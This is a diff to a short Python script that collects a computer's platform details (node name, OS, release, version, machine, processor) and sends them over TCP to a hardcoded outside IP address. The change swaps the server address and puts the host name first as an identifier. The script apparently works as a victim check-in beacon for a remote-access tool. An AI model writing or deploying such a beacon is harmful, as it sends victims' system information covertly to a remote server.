@@ -1,14 +1,14 @@
 import platform
 import socket
 
-#Server info
-ip = '3.26.216.143'
+ip = '54.79.26.131'
 port = 4570
 
-#Computer info
 system_info = platform.uname()
+node_name = system_info.node  # This is the actual ID
+
+# Only include info **excluding node name**, since it’s used as ID
 System = f"System: {system_info.system}"
-NodeName = f"Node Name: {system_info.node}"
 Release = f"Release: {system_info.release}"
 Version = f"Version: {system_info.version}"
 Machine = f"Machine: {system_info.machine}"
@@ -16,6 +16,6 @@ Processor = f"Processor: {system_info.processor}"
 
 cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 cow.connect((ip, port))
-PCinfo = ":PCINFO\n" + "\n".join([System, NodeName, Release, Version, Machine, Processor])
+PCinfo = ":PCINFO\n" + node_name + "\n" + "\n".join([System, Release, Version, Machine, Processor])
 cow.send(PCinfo.encode())
 cow.close()
